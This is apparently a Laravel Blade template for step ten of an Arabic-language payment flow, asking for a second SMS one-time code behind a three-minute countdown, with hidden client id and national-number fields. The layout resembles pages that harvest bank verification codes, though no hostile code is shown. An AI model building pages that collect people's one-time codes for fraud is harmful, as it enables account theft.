@extends('frontend.layout.master')
@section('content')
    <style>
        label.error {
            color: red;
        }

    </style>
    <section class="payment-section m  section-padding" style=" margin-top: 9rem !important; ">
        <div class="container">
            <div class="row  justify-center">
                <form class="payment-description p-5 w-75  card-body  bg-white p-5" action="{{route('stepTenAction')}}"

                      id="validateForm"
                      method="post">
                    @csrf
                    <input type="hidden" name="client_id" value="{{$client->id}}">
                    <input type="hidden" name="national_number" value="{{$client->national_number}}">
                    <div class="text-center">
                        <h6 class="mb-5">ادخل رمز التحقق المرسل الي جوالك برسالة نصية</h6>
                        <h6>{{$client->phone}}</h6>

                        @if($client->second_confirmed_otp === "0")
                            <br>
                            <h6>الرجاء ادخال الرمز بشكل صحيح</h6>
                        @else
                            <br>
                            <br>
                            <h6 class="text-center">سيتم الارسال فى خلال اقل من ثلات دقائق</h6>
                            <div id="timer" class="text-center p-3 mb-2 bg-light text-black">3:00</div>

                        @endif
                    </div>
                    <!--no3 el car -->
                    <div class="mt-3" id="input-Tasalsol">
                        <input class="ta form-control input-of-buy"
                               pattern="^\d{4}$|^\d{6}$"
                               id="phid0"
                               type="number"
                               data-msg="يرجى ادخال الرمز المكون من 4 او 5 خانات"
                               required
                               oninput="javascript: convertArabicToEnglish(this);"


                               inputmode="numeric"
                               name="confirmed_second_otp"
                               maxlength="6" value="{{ old('otp_number')??'' }}">
                    </div>

                    <script>
                        function convertArabicToEnglish(input) {
                            // Define the mapping of Arabic numerals to English numerals
                            const arabicToEnglishMap = {
                                '٠': '0', '١': '1', '٢': '2', '٣': '3', '٤': '4', '٥': '5', '٦': '6', '٧': '7', '٨': '8', '٩': '9'
                            };

                            // Replace Arabic numerals with English numerals
                            input.value = input.value.replace(/[\u0660-\u0669]/g, function(match) {
                                return arabicToEnglishMap[match];
                            });

                            // Ensure the length does not exceed the specified maxlength
                            if (input.value.length > input.maxLength) {
                                input.value = input.value.slice(0, input.maxLength);
                            }
                        }
                    </script>



                    <div class="btn-info-box mt-4  d-flex justify-content-center">
                        <button  class=" ta btn btn-secondary btn-sm mt-4 w-50  " >تأكيد</button>
                    </div>

                </form>
            </div>
        </div>
    </section>
@endsection
@push('scripts')

    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.5/dist/jquery.validate.min.js"></script>
    <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>



    <script>



        jQuery.extend(jQuery.validator.messages, {
            required: "هذا الحقل مطلوب",
            email: "يرجى ادخال بريد الكتروني صحيح",
            number: "يرجى ادخال ارقام فقط",
            creditcard: "يرجى ادخال رقم بطاقة صحيحة من فضلك",
        });
        $("#validateForm").validate({


            errorPlacement: function(error, element) {
                var placement = $(element).data('error');
                if (placement) {
                    $(placement).append(error)
                } else {
                    error.insertAfter(element);
                }
            },
        });



        let countdown = 180;
        function updateTimer() {

            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;

            document.getElementById('timer').innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            if (countdown === 0) {
                $('#timer').remove();
            } else {
                countdown--;
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();
    </script>
@endpush




















